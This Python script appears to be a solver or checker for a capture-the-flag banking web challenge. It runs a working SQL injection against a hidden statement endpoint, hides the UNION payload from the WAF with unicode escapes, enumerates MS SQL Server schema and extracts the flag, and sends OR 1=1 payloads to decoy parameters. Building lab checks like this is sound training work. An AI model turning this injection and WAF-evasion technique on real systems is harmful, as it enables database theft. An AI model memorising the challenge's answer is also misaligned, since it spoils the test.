import json
import re
import sys

import requests

B = sys.argv[1].rstrip("/") + "/bank"
s = requests.Session()


def step(n, ok):
    print(f"{n}: {'PASS' if ok else 'FAIL'}")


def esc(t):
    return "".join("\\u%04x" % ord(c) for c in t)


acc = 1


def stmt(to, **kw):
    body = '{"account":%d,"to":"%s"%s}' % (acc, to, "".join(',"%s":%s' % (k, json.dumps(v)) for k, v in kw.items()))
    return s.post(B + "/api/statement", data=body, headers={"Content-Type": "application/json"})


def inj(cols):
    return stmt(esc("2024-12-31' UNION SELECT " + cols + " WHERE '1'='1"))


def texts(r):
    try:
        return " ".join(str(x.get("description")) for x in r.json())
    except Exception:
        return ""


# the endpoint is not linked anywhere
seen, todo = set(), ["/bank/"]
html = ""
while todo and len(seen) < 40:
    p = todo.pop()
    if p in seen:
        continue
    seen.add(p)
    r = s.get(sys.argv[1].rstrip("/") + p)
    html += r.text
    for m in re.findall(r'href="(/bank/[^"?#]*)', r.text):
        todo.append(m)
step("endpoint-not-linked", "/api/statement" not in html and "statement" not in html.lower())
step("no-login-forms", "type=\"password\"" not in html and "Sign in" not in html)

# hidden endpoint behaviour
step("hidden-endpoint-not-404", s.get(B + "/api/statement").status_code == 405)
step("missing-account", s.post(B + "/api/statement", json={}).status_code == 400)
step("baseline-statement", stmt("2024-12-31").status_code == 200)
step("waf-blocks-plain-union", stmt("2024-12-31' UNION SELECT NULL,NULL,NULL,NULL WHERE '1'='1").status_code == 403)
step("validator-needs-date-prefix", stmt("x' OR '1'='1").status_code == 400)

step("version", "Microsoft SQL Server" in texts(inj("NULL,@@version,NULL,NULL")))
t = texts(inj("NULL,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables),NULL,NULL"))
step("tables", "internal_notes" in t and "staff_users" in t)
t = texts(inj("NULL,(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='internal_notes'),NULL,NULL"))
step("columns", "note_value" in t and "note_key" in t)
t = texts(inj("NULL,(SELECT STRING_AGG(note_value,',') FROM internal_notes),NULL,NULL"))
step("flag", "FLAG{securebank_" in t)

# decoys
r = stmt("2024-12-31", q="x' OR '1'='1")
step("decoy-q-escaped", r.status_code == 200 and r.json() == [])
step("decoy-from-strict", s.post(B + "/api/statement", json={"account": acc, "from": "2024-01-01' OR '1'='1", "to": "2024-12-31"}).status_code == 400)
step("decoy-account-int", s.post(B + "/api/statement", json={"account": "%d OR 1=1" % acc}).status_code == 400)
step("decoy-type-allowlist", stmt("2024-12-31", type="credit' OR '1'='1").status_code == 400)
step("decoy-history-int", s.get(B + "/api/history", params={"account": "1 OR 1=1"}).status_code == 400)
step("decoy-atm-quote", s.get(B + "/atm", params={"zip": "1'"}).status_code == 500)
step("decoy-branches-param", "No branches found" in s.get(B + "/branches", params={"city": "x' OR '1'='1"}).text)
step("decoy-branch-int", s.get(B + "/branch", params={"id": "1 OR 1=1"}).status_code == 404)
step("decoy-rates-param", "No rates found" in s.get(B + "/rates", params={"type": "x' OR '1'='1"}).text)
step("decoy-admin-403", s.get(B + "/admin").status_code == 403)
